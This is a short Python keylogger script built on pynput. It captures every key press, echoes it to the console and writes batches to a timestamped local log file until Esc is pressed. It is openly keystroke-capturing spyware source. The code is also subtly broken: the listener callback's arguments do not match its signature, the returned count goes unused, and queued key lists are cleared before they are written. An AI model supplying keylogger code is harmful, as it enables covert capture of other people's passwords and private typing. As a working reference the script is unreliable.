import pynput
from pynput.keyboard import Key, Listener
import datetime
import time
import threading
import queue


def write_file_worker(queue, unix_time):
    """Worker function to write keystrokes to a file in the background."""
    with open(f"log_{unix_time}.txt", "a") as file:
        while True:
            keys = queue.get()
            if keys is None:
                break

            buffer = ""
            for key in keys:
                if key == Key.space:
                    buffer += " "
                elif not isinstance(key, Key):
                    buffer += str(key).replace("'", "\n")

            file.write(buffer)


def on_press(key, keys, count, queue):
    """Reset the `count` to zero, and transfer the data in `keys` to the designated text file while clearing the list."""
    keys.append(key)
    count += 1
    print(f"{key} pressed")

    if count >= 10:
        count = 0
        queue.put(keys)
        keys.clear()

    return count


def on_release(key, queue):
    """Kill the program on hitting the `Esc` button."""
    if key == Key.esc:
        queue.put(None)
        return False


unix_time = int(time.mktime(datetime.datetime.now().timetuple()))
count, keys = 0, []
queue = queue.Queue()

write_file_thread = threading.Thread(
    target=write_file_worker, args=(queue, unix_time))
write_file_thread.start()

with Listener(on_press=on_press, on_release=lambda key: on_release(key, queue)) as listener:
    listener.join()

write_file_thread.join()
